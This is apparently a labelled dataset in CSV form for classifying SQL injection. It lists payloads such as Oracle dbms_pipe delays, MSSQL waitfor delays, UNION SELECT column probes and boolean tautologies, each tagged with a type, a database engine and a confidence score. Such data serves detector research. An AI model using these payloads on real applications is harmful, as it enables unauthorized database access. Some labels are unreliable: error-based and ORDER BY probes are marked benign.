id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20014,"1 ) where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20016,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20075,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20112,"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20033,"iif ( 2084 = 5671,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20040,waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20046,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20087,"-2964"" ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
20141,"iif ( 1878 = 2513,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20179,1 ) as crsd where 5271 = 5271 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20007,"1' ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
20017,"-4586' ) as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
20019,-2717' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
20020,"1 ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
20023,"-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
20028,"-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20029,"1' ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
20030,"1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20038,"-8812"" ) where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20047,"1"" ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
20050,-1087 ) where 5787 = 5787 union all select 5787#,union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
20053,"-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
20058,"1 ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
20059,"1%"" ) ) ) and 7758 = 4792 and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
20067,"-4280%"" ) ) ) union all select 7981,7981--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
20072,"-1072%"" ) ) or 3090 = 3539",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
20073,"-9574' ) as rxym where 4719 = 4719 union all select 4719,4719,4719,4719,4719,4719,4719--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
20074,"-8833' ) ) union all select 3227,3227,3227,3227,3227--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
20079,"-4637"" where 8354 = 8354 or 1186 = 2714--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
20082,"-9558"" ) ) ) union all select 2935,2935,2935,2935,2935--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
20083,"1' ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
20084,"1%' ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
20088,"-9208%"" ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
20089,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
20091,"-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,2
